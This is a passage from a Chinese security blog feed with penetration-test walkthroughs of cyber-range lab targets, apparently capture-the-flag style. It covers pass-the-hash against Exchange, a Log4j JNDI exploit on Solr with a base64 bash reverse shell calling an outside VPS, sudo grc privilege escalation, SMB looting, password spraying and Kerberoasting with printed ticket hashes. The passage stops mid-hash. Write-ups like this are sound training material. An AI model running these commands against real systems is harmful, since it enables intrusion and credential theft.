https://github.com/Jumbo-WJB/PTH_Exchange.git  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里要利用上面拿到的lumia的hash，将outlook中的邮件下载下来</p><pre class="line-numbers language-none"><code class="language-none">1146    Lumia   862976f8b23c13529c2fb1428e710296        512<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">cd /usr/share/doc/python3-impacket/examples/PTH_Exchangeproxychains python3 pthexchange.py --target https://172.22.3.9/ --username Lumia --password '00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296' --action Download<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/e832227f5d597e23253d6243c9faf3f7.png"></p><p>在item-0.eml发现提示，于是爆破手机号</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/26af00071b886e2130bac1caaa09c05b.png"></p><p>将csv的电话号码导出为字典文件</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> csv<span class="token keyword">def</span> <span class="token function">extract_phone_numbers</span><span class="token punctuation">(</span>csv_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    phone_numbers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>csv_file<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        reader <span class="token operator">=</span> csv<span class="token punctuation">.</span>reader<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> row <span class="token keyword">in</span> reader<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">3</span><span class="token punctuation">:</span>                phone_numbers<span class="token punctuation">.</span>append<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> phone_numbers<span class="token keyword">def</span> <span class="token function">write_phones_to_file</span><span class="token punctuation">(</span>phone_numbers<span class="token punctuation">,</span> output_file<span class="token operator">=</span><span class="token string">"pass.txt"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>output_file<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> phone <span class="token keyword">in</span> phone_numbers<span class="token punctuation">:</span>            <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>phone <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>csv_file <span class="token operator">=</span> <span class="token string">"item-1-phone lists.csv"</span>phones <span class="token operator">=</span> extract_phone_numbers<span class="token punctuation">(</span>csv_file<span class="token punctuation">)</span>write_phones_to_file<span class="token punctuation">(</span>phones<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"提取的电话号码已保存到 pass.txt 文件中。"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c76ed939afae45150c507e9076762021.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/37d22bc81e8782e913a17a3fb5e3c904.png"></p><p>最后用爆破即可</p><pre class="line-numbers language-none"><code class="language-none">unzip secret.zip    Archive:  secret.zip[secret.zip] flag.docx password:18763918468<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/b53c8db6d7dbbabfd48dc23fa0babfd6.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 春秋云镜 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Certify</title>
      <link href="/2025/08/13/certify/"/>
      <url>/2025/08/13/certify/</url>
      
        <content type="html"><![CDATA[<h1 id="Certify"><a href="#Certify" class="headerlink" title="Certify"></a>Certify</h1><h3 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面/tools/tools/fscan_all_version<span class="token punctuation">]</span>└─$ ./fscan <span class="token parameter variable">-h</span> <span class="token number">39.98</span>.107.120   ___                              _      / _ <span class="token punctuation">\</span>     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __  / /_<span class="token punctuation">\</span>/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ // /_<span class="token punctuation">\</span><span class="token punctuation">\</span>_____<span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>    <span class="token punctuation">\</span>____/     <span class="token operator">|</span>___/<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>_<span class="token punctuation">\</span>                        fscan version: <span class="token number">1.8</span>.4start infoscan<span class="token number">39.98</span>.107.120:22 <span class="token function">open</span>Open result.txt error, <span class="token function">open</span> result.txt: permission denied<span class="token number">39.98</span>.107.120:80 <span class="token function">open</span>Open result.txt error, <span class="token function">open</span> result.txt: permission denied<span class="token number">39.98</span>.107.120:8983 <span class="token function">open</span>Open result.txt error, <span class="token function">open</span> result.txt: permission denied<span class="token punctuation">[</span>*<span class="token punctuation">]</span> alive ports len is: <span class="token number">3</span>start vulscan<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://39.98.107.120      code:200 len:612    title:Welcome to nginx<span class="token operator">!</span>Open result.txt error, <span class="token function">open</span> result.txt: permission denied<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://39.98.107.120:8983 code:302 len:0      title:None 跳转url: http://39.98.107.120:8983/solr/Open result.txt error, <span class="token function">open</span> result.txt: permission denied<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://39.98.107.120:8983/solr/ code:200 len:16555  title:Solr AdminOpen result.txt error, <span class="token function">open</span> result.txt: permission denied已完成 <span class="token number">3</span>/3<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 扫描结束,耗时: <span class="token number">36</span>.573499548s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8867c374f476e2e79748d115e69513c6.png"></p><p>用 <code>dnslog</code> 探测一下是否存在 <code>log4j2</code> 漏洞<a href="http://www.dnslog.cn/">DNSLog Platform</a></p><pre class="line-numbers language-none"><code class="language-none">http://121.89.212.114:8983/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.hsd11b.dnslog.cn} #hsd11b.dnslog.cn是DNSLog Get SubDomain的urlhttp://39.98.107.120:8983/solr/admin/cores?action=${jndi:ldap://76viqa.dnslog.cn}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/26f533c43d16ef881ecd7e6d0e3f6851.png"></p><pre class="line-numbers language-none"><code class="language-none">先测试一下对方服务器是否会访问我们输入的网址/solr/admin/cores?action=${jndi:ldap://ydhthi.dnslog.cn}在dnslog成功接受，说明访问该路由可以让对方访问我们的网址，这里利用rogue-jndi进行注入在vps上操作git clone https://github.com/veracode-research/rogue-jndicd rogue-jndimvn packageecho 'bash -c bash -i &gt;&amp;/dev/tcp/47.105.50.21/7777 0&gt;&amp;1' | base64java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvNDcuMTA1LjUwLjIxLzc3NzcgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "47.105.50.21" nc -lvnp 7777传入参数为${jndi:ldap://47.105.50.21:1389/o=reference}39.99.137.92:8983/solr/admin/cores?action=${jndi:ldap://47.105.50.21:1389/o=reference}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先在<code>VPS</code>上架设<code>http</code>服务，<code>wget</code>下载linux_x64_agent</p><pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里<code>wget</code>下载时注意也要用<code>grc</code>提权</p><pre class="line-numbers language-none"><code class="language-none">sudo grc --pty wget http://47.105.50.21/linux_x64_agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">solr@ubuntu:/tmp/xx$ sudo -lsudo -lMatching Defaults entries for solr on ubuntu:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser solr may run the following commands on ubuntu:    (root) NOPASSWD: /usr/bin/grc        solr@ubuntu:/tmp/xx$ sudo grc --helpsudo grc --helpGeneric Colouriser 1.11.3grc [options] command [args]Options:-e --stderr    redirect stderr. If this option is selected,               do not automatically redirect stdout-s --stdout    redirect stdout, even if -e is selected-c name --config=name    use name as configuration file for grcat--colour=word  word is one of: on, off, auto--pty          run command in pseudoterminal (experimental)    #在伪终端（pseudoterminal）中运行命令（实验性功能）。solr@ubuntu:/tmp/xx$ sudo grc --pty cat /root/flag/flag01.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="C:/Users/16256/AppData/Roaming/Typora/typora-user-images/image-20250812225159795.png" alt="image-20250812225159795"></p><hr><h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h3><pre class="line-numbers language-none"><code class="language-none">sudo grc --pty chmod 777 linux_x64_agent./linux_x64_admin -c 39.99.137.92:7879 -s 123sudo grc --pty ./linux_x64_agent -l 7879 -s 123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">olr@ubuntu:/tmp/xx$ ifconfigifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.22.9.19  netmask 255.255.0.0  broadcast 172.22.255.255<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>扫一下</p><pre class="line-numbers language-none"><code class="language-none">dowmload /tmp/xx/result.txt /home/kali/桌面/result.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">─$ cat result.txt                              172.22.9.7:80 open172.22.9.47:80 open172.22.9.19:80 open172.22.9.19:22 open172.22.9.47:22 open172.22.9.47:21 open172.22.9.19:8983 open172.22.9.7:88 open172.22.9.26:445 open172.22.9.47:445 open172.22.9.7:445 open172.22.9.26:139 open172.22.9.47:139 open172.22.9.7:139 open172.22.9.26:135 open172.22.9.7:135 open[*] NetInfo [*]172.22.9.26   [-&gt;]DESKTOP-CBKTVMO   [-&gt;]172.22.9.26[*] NetBios 172.22.9.7      [+] DC:XIAORANG\XIAORANG-DC    [*] NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server 2016 Datacenter 14393[*] NetInfo [*]172.22.9.7   [-&gt;]XIAORANG-DC   [-&gt;]172.22.9.7[*] WebTitle http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works[*] WebTitle http://172.22.9.19        code:200 len:612    title:Welcome to nginx![*] OsInfo 172.22.9.47  (Windows 6.1)[*] NetBios 172.22.9.47     fileserver                          Windows 6.1[*] WebTitle http://172.22.9.19:8983   code:302 len:0      title:None 跳转url: http://172.22.9.19:8983/solr/[*] WebTitle http://172.22.9.7         code:200 len:703    title:IIS Windows Server[*] WebTitle http://172.22.9.19:8983/solr/ code:200 len:16555  title:Solr Admin[+] PocScan http://172.22.9.7 poc-yaml-active-directory-certsrv-detect 172.22.9.47:445 open172.22.9.47:139 open172.22.9.7:139 open172.22.9.26:139 open172.22.9.47:21 open172.22.9.26:135 open172.22.9.7:135 open172.22.9.7:445 open172.22.9.47:80 open172.22.9.7:80 open172.22.9.47:22 open172.22.9.19:80 open172.22.9.19:22 open172.22.9.19:8983 open172.22.9.7:88 open172.22.9.26:445 open[*] WebTitle http://172.22.9.19        code:200 len:612    title:Welcome to nginx![*] NetInfo [*]172.22.9.7   [-&gt;]XIAORANG-DC   [-&gt;]172.22.9.7[*] NetInfo [*]172.22.9.26   [-&gt;]DESKTOP-CBKTVMO   [-&gt;]172.22.9.26[*] WebTitle http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works[*] WebTitle http://172.22.9.7         code:200 len:703    title:IIS Windows Server[*] NetBios 172.22.9.7      [+] DC:XIAORANG\XIAORANG-DC    [*] WebTitle http://172.22.9.19:8983   code:302 len:0      title:None 跳转url: http://172.22.9.19:8983/solr/[*] NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server 2016 Datacenter 14393[*] NetBios 172.22.9.47     fileserver                          Windows 6.1[*] WebTitle http://172.22.9.19:8983/solr/ code:200 len:16555  title:Solr Admin[+] PocScan http://172.22.9.7 poc-yaml-active-directory-certsrv-detect <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">172.22.9.19:入口IP172.22.9.7:域控制器DC172.22.9.26:域成员172.22.9.47:文件服务器172.22.9.13:CA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据提示，文件服务器猜测存在smb的共享，但是fscan不扫描smb的共享模式，只能使用nmap扫描</p><pre class="line-numbers language-none"><code class="language-none">proxychains nmap -sT -A -Pn 172.22.9.47 &gt;&gt; nmap01.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~]└─# cat nmap01.txt  Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 11:05 EDTNmap scan report for 172.22.9.47Host is up (0.16s latency).Not shown: 995 closed tcp ports (conn-refused)PORT    STATE SERVICE     VERSION21/tcp  open  ftp         vsftpd 3.0.322/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 44:87:c2:75:d8:b5:cc:a8:3e:b6:2e:55:fa:9c:7f:cc (RSA)|   256 ac:ec:b3:76:a2:a2:3a:42:05:ba:14:99:47:a1:4f:71 (ECDSA)|_  256 d8:d9:3e:58:6a:66:c9:ea:47:91:53:be:3b:f2:d8:56 (ED25519)80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It works139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSUNo OS matches for hostService Info: Host: FILESERVER; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)|   Computer name: fileserver|   NetBIOS computer name: FILESERVER\x00|   Domain name: \x00|   FQDN: fileserver|_  System time: 2025-08-12T23:09:15+08:00|_clock-skew: mean: -2h39m58s, deviation: 4h37m05s, median: 0s| smb2-time: |   date: 2025-08-12T15:09:16|_  start_date: N/A| smb2-security-mode: |   3:1:1: |_    Message signing enabled but not requiredTRACEROUTE (using proto 1/icmp)HOP RTT      ADDRESS1   0.44 ms  192.168.20.22   17.39 ms 192.168.0.13   19.30 ms 10.192.128.14   20.96 ms 1.5.220.60.adsl-pool.sx.cn (60.220.5.1)5   ... 30OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 215.85 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><table><thead><tr><th>139/tcp</th><th>open</th><th>netbios-ssn</th><th>Samba smbd 3.X-4.X</th><th>SMB 协议相关端口（NetBIOS 会话服务），用于文件共享</th></tr></thead><tbody><tr><td>445/tcp</td><td>open</td><td>netbios-ssn</td><td>Samba 4.7.6-Ubuntu</td><td>SMB 核心端口，Samba 版本为 4.7.6（2018 年发布），存在历史漏洞（如 EternalBlue 相关漏洞需结合版本判断）</td></tr></tbody></table><ol><li>SMB 服务<ul><li>枚举共享目录：<code>smbclient -L //172.22.9.47 -N</code>（匿名登录），查看是否有可访问的共享（如 <code>fileshare</code> 等）。</li><li>测试漏洞：结合 Samba 4.7.6 版本，检查是否存在可利用漏洞（如 <code>msfconsole</code> 搜索相关模块）。</li></ul></li></ol></blockquote><p>在<code>smbclient</code>下是不能直接看的，要用<code>get</code>下载下来</p><pre class="line-numbers language-none"><code class="language-none">smb: \&gt; ls  .                                   D        0  Tue Aug 12 10:05:34 2025  ..                                  D        0  Wed Jul 13 00:35:09 2022  personnel.db                        A    61440  Wed Jul 13 03:46:55 2022  secret                              D        0  Tue Aug 12 08:11:19 2025  Certified_Pre-Owned.7z              N  9572925  Wed Jul 13 04:12:03 2022  Certified_Pre-Owned.pdf             N 10406101  Wed Jul 13 04:08:14 2022  linux_x64_agent                     A  2227000  Tue Aug 12 10:02:35 2025  mb24.exe                            A     7168  Tue Aug 12 10:05:34 2025  mb24                                A      198  Tue Aug 12 10:04:25 2025                41152812 blocks of size 1024. 36030120 blocks availablesmb: \&gt; cat personnel.dbcat: command not foundsmb: \&gt; get personnel.dbgetting file \personnel.db of size 61440 as personnel.db (58.0 KiloBytes/sec) (average 58.0 KiloBytes/sec)smb: \&gt; cd secretsmb: \secret\&gt; ls  .                                   D        0  Tue Aug 12 08:11:19 2025  ..                                  D        0  Tue Aug 12 10:05:34 2025  flag02.txt                          N      659  Tue Aug 12 08:11:19 2025                41152812 blocks of size 1024. 36030112 blocks availablesmb: \secret\&gt; get flag02.txtgetting file \secret\flag02.txt of size 659 as flag02.txt (1.0 KiloBytes/sec) (average 36.0 KiloBytes/sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要注意在哪一个目录下运行<code>smbclient</code>，<code>smb</code>就会把下载的文件放到该目录下</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/68a24d1af916ce3338ab57d3b796f761.png"></p><hr><h3 id="flag03-04"><a href="#flag03-04" class="headerlink" title="flag03&amp;04"></a>flag03&amp;04</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/e92db1f3795daeae31bc9716bd78477b.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ca9516504531bf2370b7ea0219d56d78.png"></p><p>开始爆破</p><pre class="line-numbers language-none"><code class="language-none">proxychains crackmapexec smb  172.22.9.26 -u user.txt -p pwd.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c0862119d452fca9b17d488e8eeaa2e8.png"></p><p>xiaorang.lab\zhangjian:i9XDE02pLVf 但是rdp登录不上去</p><p>根据提示看spn</p><blockquote><p>在 Windows Active Directory（AD）环境中，<strong>SPN（Service Principal Name，服务主体名称）</strong> 是一个唯一标识服务实例的名称，用于 Kerberos 认证过程中，让客户端能够识别并向特定服务进行身份验证。</p><p>对于<strong>域用户（Domain User）</strong> 而言，其 SPN 通常是指该用户被配置为运行某个服务时，为该服务注册的 SPN。简单来说，当一个域用户被用作服务账户（例如运行 Web 服务、数据库服务等）时，需要为该用户关联对应的 SPN，以便客户端通过 Kerberos 向该服务认证。</p><p>域用户 SPN 的格式</p><p>SPN 的基本格式为：<br><code>服务类/主机[:端口]/服务名</code></p></blockquote><pre class="line-numbers language-none"><code class="language-none">──(root㉿kali)-[~/data]└─# proxychains impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf[proxychains] config file found: /etc/proxychains4.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.9.7:389  ...  OKServicePrincipalName                   Name      MemberOf  PasswordLastSet             LastLogon                   Delegation -------------------------------------  --------  --------  --------------------------  --------------------------  ----------TERMSERV/desktop-cbktvmo.xiaorang.lab  zhangxia            2023-07-14 00:45:45.213944  2025-08-12 11:05:49.595730             WWW/desktop-cbktvmo.xiaorang.lab/IIS   zhangxia            2023-07-14 00:45:45.213944  2025-08-12 11:05:49.595730             TERMSERV/win2016.xiaorang.lab          chenchen            2023-07-14 00:45:39.767035  &lt;never&gt;                                [-] CCache file is not found. Skipping...[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.9.7:88  ...  OK[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.9.7:88  ...  OK[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.9.7:88  ...  OK$krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$f093afb31abc8b185173840e39c4b8d7$e110b66b21d3d6661fc03e13583677f35e53fb3c19f8c2b687dc0501ddba746754eb1217a142d9efb36e06213f127004a08f81c49555474f8ac6405a1201917f26ae4ce4225d09e985e842a1f131ddcbee786c740a3524c8babbd36486d00d95db2f137f149f7462b504ac7922edc291cd62989a9cb0fe99ad91852a8b1eac20da7e6e431012e557812e44b48e1183c4a795ffdb29b253bda8048c8300b1b285bcb3e210f579ee2eb4aec255d3b8dbbf82c93d85d853f050ad2365523fc2b18c1c08b96135ccf60bce476d30a3b7856eeb5f36d3586daba858376a8c36cfa5df939cf347beca0a89f364ed391c52b7a40b3410d5ae3f3990f11212a4263ad129c64ecc4e48e3f42c555baa956029073aa6559dc89630536e0243d356b44ffcc3e9f505c99f9684230ef5467ff11ff2647a25c76896b67bf12c11f6b1b203607bf59b9ecf64b826b71ff0124186d6417e8d535febd7dbf62669eb51a14743b92d6db14332ed49aa8fa7d2ab3449c302d2452050cfb6a3de0c5f899766a2f608112e49c88483db18143cded77ad0a5d154476a35e6037d670c8e203e25109acbb05b84aee0269fb132c0b0706686cf0957ff70b0c357e708a6629379478614759a816788d6f9e4a9464670f2088b7b4741aafd1492971e700cc1a85a4b773a5518695c3a44f13d4feff7c01c37895f12f6f39d5c981b7bb1c31dc05feed2fe7e1be95cd3b09d085256e3c49c24b347c1be7f876449bc43ea9caba61f3380f879215f7d9116c9433b393513c4fa28d0dc819cebc6ee12806169b86d3511bd02699284e8c91dd44eb3b199ffaa41949196706ecd236d6a34293711db81c7b3a744aeb2a438426e5e4cc0654de099d1278caf72a3d25497eadce4617cd0765c1073925c8dd18ba5290472deb1d76c66c1e8a1b22635510331e348a2f0b1b0b3544d82d1b48b79792bc32210495846fd034a7715cb646ca9c949207919369cb5c544ea194e69c1599d18307798150fd36285e8ca785bb44fa54b904174afbeb1da0a8f0bf6fdadef00d7ab94f31342411b498e599b7d0244d5ce3c9d7eded7afa4167600f3f61c16ffea20887514d3cddfe5fac6fe450c73f4ef0f62840869c8787cee5392dcdb000f1aa3c44821fd40cd9b9519c00f2feefe1103b07d053f211d2dfb9c5a48dd72362f2de94409cd0ed5d174ab3ccbbe08199e582021b4121283a119700138d10c7eeaebde76876a6a1f6af4ecb34e3c261fcd020314bf670847d2a67f86e75c78b92590ecd89a517ed28cf08434b0fb17e88f06aa6d2159e274fa9f435ec82bd5a45652acd303fca59f793e391e67661d74a5684a307b837553f32bdfaa4489478937caed0193ae5bc658549d661487aeb12d7786b4c42543cced6be37b79045c7ded460663207ace3c928c50651e40d5682b84cabc2d452c5cf7dbca1c2d8c54504a8a4514fffd65ea3eafb728bf4ba0232d5bd1700f28188bb42b845bf8394a9abfb4e08da9bf7001[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.9.7:88  ...  OK$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$2bc5d8eada5a51a14c4d06c44d3fc995$a170dfe49730d9d912b19a58038edf5ba8f1cf594dafe5eedf1c7a70b15b946538434458c47dd8c4434e5c6618384a4970c9fcc7a37ec45c7feac459e5cf50faf407af0562779b005517727a5144fbf7253b2c0f9e2bb7da5c609fe83683076186a9a1f7a204bf1e54624659a5bbb79a6f78c7bc5d2a10ab8a25cade100312b72f3421245279699a088a63abb842767b1f3c9110f6071d941a7ce625d32f7ee390abb43f5667f721db0d746b9dbcfb6d649ac343904640e7fb8114585a6134f94ceff302e6145279b7c2a9a7262385046144572be7a85fd1b48f0d63f7154198a4716cc601de00c969841828f6d580f5f76222e59bb2ca545dc3ea01e6980087f11695558acc7ccece30f57872c2a46d1b2140e1a4f247451ba0164bea081cd9bff57d0868c8d258602970b8787f2e50c3ce4d611a529d7b108d580c9d2eb1a952515575405682124b28e1b678922a2b84ecbce0c326744b4450b81ef8250a09755eed3fe77dc7bb89df91a0574674ec6275174c784e5f1d18bfe5283e7aa11758f7fa1f53ed32baedcf748afa51a11810f53d90364eb2be277c08b0e41c66e9c660cd0746041c051f928d818441ba49512d07f660c7f6dae109837384ad36e3a768394bd9047faf939aef8cb468e57d8fbd39c861e3899797854a5160bd88e78d081d0c7039d9014eab1ba488b0f47dddc28f6aefc097dcebede6674262f618fa5ba6b91b863a1d5f7e263296614075cd310c536eb873b7174ca4dacaf340eefdb340c3476f17b891066b3af20638b06122c95a8a3f8ae71b4e36178d86d7ec7b8d16ad88c55fedb75a82f290793174e2b9a1ec09fb01940857f9e00acd0c8aa414fef2177361f8cd83cda94dfef33f8d79c4aa4ba79707987f295cb962f2ebcf53953cb7dcd697d40c8feade39bf7c58031144c7bbd2fa9cac36727d0b6516ee23494da31770514bb8d8beb7c6c63fa83e2fd5e4285798914d367fa427087c68d8e2b63b88020c32ba6dc8b34aa0c3d16b03014278d42084efe38d77f561f0887a734b863bc45ad38e2d5181ec27d3cf13d31b346dda9710048350a5afab68044506b6622f3a8ea5d0262750dae4d68b3691795320c216e253c97efbe8a52d0956e88ac38425af2b6ca1ebc94fe6041bdcc6494acdc8a1c32cd5216050c87b840665a9b19806aa502c75e88418aa8fb6ddea5fe9dbedd3c1625529595440f04fdf48a79ac403a0e0ed1d9ff6c56a73a0dcea00baa74d5daeb4f9d8b41ba8e47382e341f6760dec